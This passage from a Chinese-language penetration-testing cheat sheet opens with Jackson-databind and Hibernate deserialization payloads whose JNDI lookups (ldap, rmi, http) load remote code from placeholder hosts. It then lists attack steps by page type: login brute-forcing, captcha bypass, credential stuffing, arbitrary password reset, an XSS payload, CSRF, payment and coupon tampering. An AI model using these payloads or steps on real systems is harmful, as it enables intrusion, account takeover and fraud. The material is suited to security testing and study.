{"@type": "org.hibernate.jmx.StatisticsService","SessionFactoryJNDIName": "rmi://StatisticsService.localhost/StatisticsService"}

```
#### jackson_databind反序列化
> **jackson_databind反序列化payload集合**
```
{"param": ["com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",{"properties": {"UserTransaction":"ldap://jackson_databind_9547.localhost/jackson_databind_9547"}}]}

{"param": ["br.com.anteros.dbcp.AnterosDBCPConfig", {"healthCheckRegistry": "ldap://jackson_databind_9548.localhost/jackson_databind_9548"}]}

{"param": ["com.caucho.config.types.ResourceRef", {"lookupName": "ldap://jackson_databind_10673.localhost/jackson_databind_10673"}]}

{"param": ["org.apache.openjpa.ee.WASRegistryManagedRuntime",{"registryName": "ldap://jackson_databind_11113.localhost/jackson_databind_11113"}]}

param=["ch.qos.logback.core.db.JNDIConnectionSource", {"jndiLocation": "rmi://jackson_databind_12834.localhost/jackson_databind_12834"}]

{"param": ["org.springframework.context.support.FileSystemXmlApplicationContext","http://jackson_databind_7525.localhost/jackson_databind_7525"]}


```

## 渗透流程思路

### 登陆框

> **暴力破解用户名密码，验证码爆破和绕过，手机号撞库，测试sql注入，未授权访问，返回包绕过**

暴力破解用户名密码：固定用户名如：admin进行爆破密码，固定默认密码如：123456进行爆破用户名<br>
验证码爆破和绕过：验证码是4位，验证码参数删除，验证码前端验证无效<br>
手机号撞库：可搜集高质量的手机号<br>
测试sql注入：用户名框、密码框<br>
未授权访问：修改成登录主页面如：/index<br>
返回包绕过：false修改true，fail修改success，0修改1，301修改200<br>

- [hacden/常用字典](https://github.com/hacden/Hack/tree/master/%E5%B8%B8%E7%94%A8%E5%AD%97%E5%85%B8)
- [klionsec/SuperWordlist](https://github.com/klionsec/SuperWordlist)
- [rootphantomer/Blasting_dictionary](https://github.com/rootphantomer/Blasting_dictionary)
- [TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)

### 注册框

> **恶意注册，xss**

恶意用户批量注册：无验证码<br>
验证码爆破和绕过：验证码是4位，验证码参数删除，验证码前端验证无效<br>
存储型XSS：注册框，使用xss<br>


### 密码找回

> **重置密码**

重置任意用户账户密码：爆破4位验证码，验证码在返回包中，第二步骤或第三步骤修改成自己接受的手机号或邮箱<br>
批量重置用户密码：默认验证码如：111111<br>


### 后台管理

> **越权访问，csrf，xss，文件上传，sql注入，xxe等**

越权访问：注意cookie、url，post中等存在的身份验证参数如：userid (个人资料信息泄漏、个人资料遍历)<br>
csrf：使用的token是否有效，是否有规律如：删除token<br>
xss：见框就插或上传后缀，如payload: "\>\<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="\>\</object\><br>
文件上传：图片上传处、视频上传处抓包绕过，ueditor编辑器漏洞<br>
sql注入：关键post参数，url隐藏参数，可结合爆破参数<br>
xxe：外部实体引用，是否支持xml格式请求<br>


### 评论区

> **csrf，xss，遍历用户名**

csrf：使用的token是否有效，是否有规律如：删除token<br>
xss：见框就插或上传后缀，如payload: "\>\<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="\>\</object\><br>
遍历用户名：可结合身份验证参数进行遍历<br>

### 购买支付

> **篡改，信息泄漏，虚假充值金额，篡改充值账户**

支付漏洞：修改价格，修改数量，数值溢出，交易信息泄漏<br>

### 抽奖_活动

> **盗刷积分**

刷取活动奖品/盗刷积分/抽奖作弊<br>


### 代金卷_优惠卷

> **批量刷取代金卷/优惠卷、更改代金卷金额、更改优惠卷数量**

条件竞争/修改金额/修改数量<br>

### 订单

> **订单信息泄漏，用户信息泄漏，订单遍历**

订单信息泄漏：越权查看别人订单信息<br>
订单遍历：订单号有规律<br>



